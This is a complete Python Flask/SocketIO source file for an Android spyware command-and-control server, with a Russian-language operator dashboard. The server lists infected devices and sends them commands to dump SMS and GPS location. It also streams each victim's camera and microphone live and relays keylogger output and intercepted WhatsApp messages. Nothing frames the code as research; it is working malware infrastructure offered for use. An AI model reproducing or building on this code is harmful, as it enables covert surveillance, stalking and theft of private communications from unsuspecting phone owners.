from flask import Flask, render_template_string, Response
from flask_socketio import SocketIO
import os
import time
import base64
import threading

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

clients = {}
camera_frames = {}
last_seen = {}

HTML = """
<!DOCTYPE html>
<html lang="ru" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>C2 Dashboard | Mobile</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #c9d1d9; overflow: hidden; }
        .font-mono { font-family: 'JetBrains Mono', monospace; }
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: #0b0f19; }
        ::-webkit-scrollbar-thumb { background: #1f2937; border-radius: 2px; }
        .sidebar { background-color: #111827; border-right: 1px solid #1f2937; z-index: 100; position: fixed; top: 0; bottom: 0; left: 0; width: 280px; transform: translateX(-100%); transition: transform 0.3s ease; }
        .sidebar.open { transform: translateX(0); }
        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 90; display: none; }
        .overlay.active { display: block; }
        .client-row { transition: background-color 0.2s; }
        .client-row:hover { background-color: #1f2937; cursor: pointer; }
        .client-row.selected { background-color: #1e3a8a; border-left: 3px solid #60a5fa; }
        .toggle-switch { position: relative; display: inline-block; width: 48px; height: 26px; }
        .toggle-switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #374151; transition: .3s; border-radius: 26px; }
        .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
        input:checked + .slider { background-color: #10b981; }
        input:checked + .slider:before { transform: translateX(22px); }
        
        @media (min-width: 768px) {
            .sidebar { transform: translateX(0); position: relative; }
            .overlay { display: none !important; }
            .mobile-header { display: none; }
            main { margin-left: 0; }
        }
    </style>
</head>
<body class="h-screen flex">

    <!-- Overlay for mobile menu -->
    <div class="overlay" id="overlay" onclick="toggleSidebar()"></div>

    <!-- SIDEBAR -->
    <aside class="sidebar flex flex-col h-full" id="sidebar">
        <div class="p-4 border-b border-gray-800 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div class="w-8 h-8 rounded bg-green-600 flex items-center justify-center text-white font-bold"><i class="fa-solid fa-mobile-screen"></i></div>
                <h1 class="text-sm font-bold text-white">ANDROID C2</h1>
            </div>
            <button class="md:hidden text-gray-400" onclick="toggleSidebar()"><i class="fa-solid fa-xmark text-xl"></i></button>
        </div>

        <div class="flex-1 overflow-y-auto p-2">
            <div class="text-xs font-semibold text-gray-500 mb-2 px-2 uppercase tracking-wider">Устройства</div>
            <div id="client-list" class="space-y-1"></div>
        </div>

        <div id="main-menu" class="hidden border-t border-gray-800 p-2 space-y-1">
            <div class="text-xs font-semibold text-gray-500 mb-2 px-2 uppercase tracking-wider mt-2">Действия</div>
            <div onclick="switchView('phone-info')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-mobile-button w-4 text-center"></i> Info</div>
            <div onclick="switchView('phone-sms')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-sms w-4 text-center"></i> SMS</div>
            <div onclick="switchView('phone-contacts')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-address-book w-4 text-center"></i> Contacts</div>
            <div onclick="switchView('phone-wa')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-brands fa-whatsapp w-4 text-center text-green-500"></i> WhatsApp</div>
            <div onclick="switchView('phone-gps')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-location-dot w-4 text-center"></i> GPS</div>
            <div onclick="switchView('phone-cam')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-camera w-4 text-center"></i> Camera</div>
            <div onclick="switchView('phone-mic')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-microphone w-4 text-center"></i> Microphone</div>
            <div onclick="switchView('phone-screen')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-tv w-4 text-center"></i> Screen</div>
            <div onclick="switchView('keylog')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400 cursor-pointer hover:bg-gray-700"><i class="fa-solid fa-keyboard w-4 text-center"></i> Spy Logs</div>
        </div>
    </aside>

    <!-- MAIN CONTENT -->
    <main class="flex-1 flex flex-col h-full bg-[#0b0f19] relative w-full">
        
        <!-- Mobile Header -->
        <header class="h-14 border-b border-gray-800 flex items-center justify-between px-4 bg-[#111827] md:hidden mobile-header">
            <button onclick="toggleSidebar()" class="text-gray-300"><i class="fa-solid fa-bars text-xl"></i></button>
            <h2 id="mobile-title" class="text-sm font-semibold text-gray-300 truncate">C2 Dashboard</h2>
            <div class="w-6"></div>
        </header>

        <!-- Desktop Header -->
        <header class="h-14 border-b border-gray-800 items-center justify-between px-6 bg-[#111827] hidden md:flex">
            <div class="flex items-center gap-4">
                <h2 id="active-client-name" class="text-sm font-semibold text-gray-300">Выберите клиента</h2>
                <span id="active-client-ip" class="text-xs font-mono text-green-400"></span>
                <span id="active-client-uptime" class="text-xs font-mono text-gray-500"></span>
            </div>
            <div class="flex items-center gap-2 text-xs font-mono text-gray-400">
                <div class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div> СЕРВЕР ONLINE
            </div>
        </header>

        <div id="view-empty" class="flex-1 flex flex-col items-center justify-center text-gray-600 p-4">
            <i class="fa-solid fa-mobile-screen text-5xl mb-4 opacity-20"></i>
            <p class="text-sm font-mono text-center">УСТРОЙСТВО НЕ ВЫБРАНО</p>
        </div>

        <!-- Все вьюхи сюда (пример одной) -->
        <div id="view-phone-info" class="hidden flex-1 p-4 md:p-6 overflow-y-auto">
            <h2 class="text-lg font-bold text-white mb-4">Информация об устройстве</h2>
            <div class="bg-[#111827] border border-gray-800 rounded-lg p-4 font-mono text-xs md:text-sm text-gray-300 break-words" id="phone-info-data"></div>
        </div>

        <div id="view-phone-sms" class="hidden flex-1 flex flex-col overflow-hidden p-4 md:p-6">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-lg font-bold text-white">SMS</h2>
                <button onclick="dumpData('sms')" class="bg-blue-600 text-white px-4 py-2 rounded text-xs md:text-sm">Запросить</button>
            </div>
            <div id="sms-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-xs md:text-sm whitespace-pre-wrap text-gray-300"></div>
        </div>

        <div id="view-phone-wa" class="hidden flex-1 flex flex-col overflow-hidden p-4 md:p-6">
            <h2 class="text-lg font-bold text-white mb-4"><i class="fa-brands fa-whatsapp text-green-500"></i> WhatsApp</h2>
            <div id="wa-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-xs md:text-sm whitespace-pre-wrap text-gray-300">Ожидание...</div>
        </div>

        <div id="view-phone-gps" class="hidden flex-1 p-4 md:p-6 overflow-y-auto flex-col">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-lg font-bold text-white">GPS</h2>
                <button onclick="dumpData('geo')" class="bg-green-600 text-white px-4 py-2 rounded text-xs md:text-sm">Запросить</button>
            </div>
            <div id="gps-data" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-6 flex flex-col items-center justify-center text-gray-400 font-mono text-sm break-words"></div>
        </div>

        <div id="view-phone-cam" class="hidden flex-1 p-4 md:p-6 flex-col">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-lg font-bold text-white">Камера</h2>
                <div class="flex gap-2">
                    <button onclick="switchCamera()" class="bg-gray-700 text-white px-3 py-1 rounded text-xs"><i class="fa-solid fa-sync"></i></button>
                    <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('camera', this.checked)"><span class="slider"></span></label>
                </div>
            </div>
            <div class="flex-1 border border-gray-800 rounded-lg bg-black flex items-center justify-center relative min-h-[50vh]">
                <img id="cam-img" src="" class="w-full h-full object-contain hidden">
                <span id="cam-placeholder" class="text-gray-700 font-mono text-xs">OFFLINE</span>
            </div>
        </div>

        <div id="view-phone-mic" class="hidden flex-1 p-4 md:p-6 flex-col">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-lg font-bold text-white">Микрофон</h2>
                <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('mic', this.checked)"><span class="slider"></span></label>
            </div>
            <div class="flex-1 border border-gray-800 rounded-lg bg-black flex items-center justify-center text-gray-600">
                <i class="fa-solid fa-headphones text-5xl"></i>
            </div>
        </div>

        <div id="view-keylog" class="hidden flex-1 flex flex-col overflow-hidden p-4 md:p-6">
            <h2 class="text-sm font-bold text-white mb-2">Keylogger</h2>
            <div id="keylog-output" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-xs text-green-500 whitespace-pre-wrap"></div>
        </div>
    </main>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        let currentClientId = null;
        let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        let lastClientsData = {};

        function toggleSidebar() {
            document.getElementById('sidebar').classList.toggle('open');
            document.getElementById('overlay').classList.toggle('active');
        }

        setInterval(() => {
            if (currentClientId && lastClientsData[currentClientId]) {
                const c = lastClientsData[currentClientId];
                const up = Math.floor(Date.now() / 1000 - c.connected_at);
                const el = document.getElementById('active-client-uptime');
                if (el) el.innerText = `В сети: ${formatUptime(up)}`;
            }
        }, 1000);

        function formatUptime(seconds) {
            if (seconds < 60) return `${seconds} сек`;
            const m = Math.floor(seconds / 60);
            if (m < 60) return `${m} мин`;
            return `${Math.floor(m / 60)} ч ${m % 60} мин`;
        }

        socket.on('update_clients', (data) => {
            lastClientsData = data;
            const list = document.getElementById('client-list');
            list.innerHTML = '';
            for (let id in data) {
                const c = data[id];
                const div = document.createElement('div');
                div.className = `client-row p-3 rounded border border-transparent ${currentClientId === id ? 'selected border-blue-800' : ''}`;
                div.innerHTML = `
                    <div class="flex justify-between items-center">
                        <span class="font-bold text-sm text-gray-200">${c.user}</span>
                        <div class="w-2 h-2 rounded-full bg-green-500"></div>
                    </div>
                    <div class="text-[10px] text-gray-500 font-mono">${c.ip} | ${formatUptime(Math.floor(Date.now()/1000 - c.connected_at))}</div>
                `;
                div.onclick = () => {
                    selectClient(id, c);
                    if (window.innerWidth < 768) toggleSidebar();
                };
                list.appendChild(div);
            }
        });

        function selectClient(id, data) {
            currentClientId = id;
            const title = document.getElementById('active-client-name');
            const ip = document.getElementById('active-client-ip');
            const mtitle = document.getElementById('mobile-title');
            if (title) title.innerText = data.user;
            if (ip) ip.innerText = data.ip;
            if (mtitle) mtitle.innerText = data.user;
            
            document.getElementById('view-empty').classList.add('hidden');
            document.getElementById('main-menu').classList.remove('hidden');
            switchView('phone-info');
            if (data.info) document.getElementById('phone-info-data').innerText = JSON.stringify(data.info, null, 2);
        }

        function switchView(view) {
            if (!currentClientId) return;
            document.querySelectorAll('main > div[id^="view-"]').forEach(el => el.classList.add('hidden'));
            const target = document.getElementById(`view-${view}`);
            if (target) {
                target.classList.remove('hidden');
                target.classList.add('flex');
            }
        }

        function toggleFeature(feature, state) { 
            socket.emit('toggle_feature', {client_id: currentClientId, feature, state}); 
            if (feature === 'camera') {
                const img = document.getElementById('cam-img');
                if (state) {
                    img.src = `/video_feed/${currentClientId}?t=${new Date().getTime()}`;
                    img.classList.remove('hidden');
                    document.getElementById('cam-placeholder').classList.add('hidden');
                } else {
                    img.src = "";
                    img.classList.add('hidden');
                    document.getElementById('cam-placeholder').classList.remove('hidden');
                }
            }
        }
        
        function switchCamera() { socket.emit('switch_camera', {client_id: currentClientId}); }
        function dumpData(type) { socket.emit('cmd_dump', {client_id: currentClientId, type}); }

        socket.on('phone_mic', (d) => {
            if (d.client_id !== currentClientId) return;
            const binary = atob(d.data); const bytes = new Uint8Array(binary.length);
            for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
            const buffer = audioCtx.createBuffer(1, bytes.length / 2, 44100);
            const channel = buffer.getChannelData(0); const view = new DataView(bytes.buffer);
            for (let i = 0; i < bytes.length / 2; i++) channel[i] = view.getInt16(i * 2, true) / 32768;
            const src = audioCtx.createBufferSource(); src.buffer = buffer; src.connect(audioCtx.destination); src.start();
        });

        socket.on('phone_data', (d) => {
            if (d.client_id !== currentClientId) return;
            if (d.type === 'sms') document.getElementById('sms-list').innerText = JSON.stringify(d.payload, null, 2);
            if (d.type === 'geo') document.getElementById('gps-data').innerHTML = `<a href="https://www.google.com/maps?q=${d.payload.lat},${d.payload.lon}" target="_blank" class="text-blue-400 hover:underline"><i class="fa-solid fa-map-location-dot mr-2"></i>${d.payload.lat}, ${d.payload.lon}</a>`;
        });

        socket.on('whatsapp_msg', (d) => {
            if (d.client_id !== currentClientId) return;
            const el = document.getElementById('wa-list');
            if (el.innerText === 'Ожидание...') el.innerText = '';
            el.innerText += `[${d.time}] ${d.text}\n`;
            el.scrollTop = el.scrollHeight;
        });

        socket.on('keylog', (d) => {
            if (d.client_id === currentClientId) {
                const out = document.getElementById('keylog-output'); out.innerText += d.data; out.scrollTop = out.scrollHeight;
            }
        });
    </script>
</body>
</html>
"""

def cleanup_loop():
    while True:
        now = time.time()
        dead = [cid for cid, t in last_seen.items() if now - t > 120]
        for cid in dead:
            if cid in clients: del clients[cid]
            if cid in last_seen: del last_seen[cid]
            if cid in camera_frames: del camera_frames[cid]
        if dead:
            socketio.emit('update_clients', clients)
        time.sleep(10)

@app.route('/')
def index(): return render_template_string(HTML)

@app.route('/video_feed/<cid>')
def video_feed(cid):
    def generate():
        while True:
            if cid in camera_frames and camera_frames[cid]:
                frame = camera_frames[cid]
                yield (b'--frame\r\n' b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            time.sleep(0.1)
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

@socketio.on('register_client')
def handle_register(data):
    cid = data['id']
    data['connected_at'] = time.time()
    clients[cid] = data
    last_seen[cid] = time.time()
    socketio.emit('update_clients', clients)

@socketio.on('unregister')
def handle_unregister(data):
    cid = data.get('id')
    if cid in clients: del clients[cid]
    if cid in last_seen: del last_seen[cid]
    if cid in camera_frames: del camera_frames[cid]
    socketio.emit('update_clients', clients)

@socketio.on('toggle_feature')
def handle_toggle(data): socketio.emit('cmd_toggle', data)

@socketio.on('switch_camera')
def handle_switch(data): socketio.emit('cmd_switch_camera', data)

@socketio.on('cmd_dump')
def handle_dump(data): socketio.emit('cmd_dump', data)

@socketio.on('phone_data')
def handle_phone_data(data): socketio.emit('phone_data', data)

@socketio.on('phone_mic')
def handle_phone_mic(data): socketio.emit('phone_mic', data)

@socketio.on('phone_cam_frame')
def handle_phone_cam_frame(data):
    cid = data.get('client_id')
    img_b64 = data.get('img')
    if cid and img_b64:
        camera_frames[cid] = base64.b64decode(img_b64)
        last_seen[cid] = time.time()

@socketio.on('whatsapp_notify')
def handle_whatsapp(data): socketio.emit('whatsapp_msg', data)

@socketio.on('keylog')
def handle_keylog(data): socketio.emit('keylog', data)

if __name__ == '__main__':
    threading.Thread(target=cleanup_loop, daemon=True).start()
    socketio.run(app, host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
